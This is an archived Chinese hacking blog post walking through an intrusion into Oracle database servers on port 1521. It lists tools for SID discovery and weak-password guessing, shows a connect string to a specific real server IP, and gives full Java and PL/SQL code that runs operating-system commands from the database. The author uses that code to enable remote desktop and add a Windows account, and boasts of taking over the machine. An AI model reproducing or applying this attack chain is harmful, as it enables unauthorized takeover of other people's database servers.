<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>入侵1521详细过程 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2012-06-21T10:26:32.000Z" itemprop="datePublished">
          2012-06-21
      </time>
    
    
    | 
    <a href='/tag/1521/'>1521</a>,
    
    <a href='/tag/oracle/'>oracle</a>
    
    
</span>
    <h1 class="post-title">入侵1521详细过程</h1>
    <section class="post-content">
      <p>入侵<a href="http://ha.cker.in/tag/1521" target="_blank">1521</a>详细过程 </p>  <p>工具： </p>  <p>1.<a href="http://ha.cker.in/tag/oracle" target="_blank">oracle</a>精简版(我这已经安装了，这跳过) </p>  <p>2.sqlplus.exe 连接oracle数据库用（oracle里自带） </p>  <p>3.tnscmd.exe&#160;&#160; 查看服务器名字/sid </p>  <p>4.oscanner.exe oracle弱口令猜解工具 </p>  <p>第一步：扫描开了1521端口的服务器，oracle默认1521端口（这步跳过，端口谁都会扫） </p>  <p>第二步：利用tnscmd.exe查看服务器数据库的名字 </p>  <p>从这步开始了，这是刚找好的IP，就用它演示了，“SERVICE_NAME=<strong>*</strong>”这就是我们需要用到的。 </p>  <p>第三步：oscanner.exe猜解弱口令。 </p>  <p>猜解不会太快，呵呵，“DBSNMP/DBSNMP found”发现一个，再让它往下继续猜……“SCOTT/TIGER    <br>found’又一个，猜完了 </p>  <p>第四步：提权（提升oracle用户权限、开3389、添加windows用户） </p>  <p>看操作吧，首先当然是要连接数据库，&quot;已连接。&quot;那就是成功了，呵呵，oracle能猜出很多弱口令，但是 </p>  <p>很多都是低权限的，没法执行命令，所以我们就要提升oracle用户权限，“已选择14行。”权限很低~~~ </p>  <p>需要重新连接数据库，再次查看权限，“已选择140行。”这就可以让我们为所欲为了，呵呵，看到这些顿时兴奋了， </p>  <p>这就是成功执行命令了，“PL/SQL 过程已成功完成。Java 已创建。函数已创建。过程已创建。…….” </p>  <p>脚本里我加了开3389和添加用户……连接它的3389试试…. </p>  <p>熟悉的画面，一台oracle服务器就这么被拿下了，呵呵…….. </p>  <p>这是手工一步步进行的，方便大家了解这一过程，我也有全自动的1521，并非网上所流传的，效果那是相当好，呵呵 </p>  <p>但是不足之处就是，抓的没数量，但有质量！！！呵呵…… </p>  <p>远程接oracle命令：   <br>C:\&gt;sqlplus /nolog    <br>SQL&gt; connect SCOTT/TIGER@(description=(address_list=(address=(protocol=tcp)(host=60.30.73.162)(port=1521)))(connect_data=(SERVICE_NAME=ebestXDB))); </p>  <p>tnscmd用法：tnscmd status -h ip –indent </p>  <p>oscanner用法：oscanner -s ip -v </p>  <p>查看当前用户权限：SELECT PRIVILEGE FROM SESSION_PRIVS; </p><a id="more"></a><p></p>  <p>利用java执行cmd： </p>  <p>create or replace and compile   <br>java souRCe named &quot;util&quot;    <br>as    <br>import java.io.<em>;    <br>import java.lang.</em>;    <br>public class util extends Object    <br>{    <br>public static int RunThis(String args)    <br>{    <br>Runtime rt = Runtime.getRuntime();    <br>int RC = -1;    <br>try    <br>{    <br>Process p = rt.exec(args);    <br>int bufSize = 4096;    <br>BufferedInputStream bis =new BufferedInputStream(p.getInputStream(), bufSize);    <br>int len;    <br>byte buffer[] = new byte[bufSize];    <br>// Echo back what the program spit out    <br>while ((len = bis.read(buffer </p>  <p>, 0, bufSize)) != -1)   <br>System.out.write(buffer, 0, len);    <br>RC = p.waitFor();    <br>}    <br>catch (Exception e)    <br>{    <br>e.printStackTrace();    <br>RC = -1;    <br>}    <br>finally    <br>{    <br>return RC;    <br>}    <br>}    <br>}    <br>/    <br>create or replace    <br>function RUN_CMz(p_cmd in varchar2) return number    <br>as    <br>language java    <br>name ‘util.RunThis(java.lang.String) return integer’;    <br>/    <br>create or replace procedure RC(p_cmd in varChar)    <br>as    <br>x number;    <br>begin    <br>x := RUN_CMz(p_cmd);    <br>end;    <br>/    <br>variable x number;    <br>set serveroutput on;    <br>exec dbms_java.set_output(100000);    <br>grant javasyspriv to system;    <br>grant javauserpriv to system;    <br>exec:x:=run_cmz(‘cmd命令’); </p>  <p>下载地址： </p>  <p><a href="http://d.namipan.com/d/93f4c0a29fb892d5dfd7b5ff1434c25d550856b3ffffb900" target="_blank" rel="external">http://d.namipan.com/d/93f4c0a29fb892d5dfd7b5ff1434c25d550856b3ffffb900</a></p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://id.cker.in/557.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://id.cker.in/557.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://id.cker.in/557.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://id.cker.in/557.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/559.seo/">
        ← WEP无客户端，不在是谜 照样拿下
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/554.seo/">
        N点虚拟主机提权实例 →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archive"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
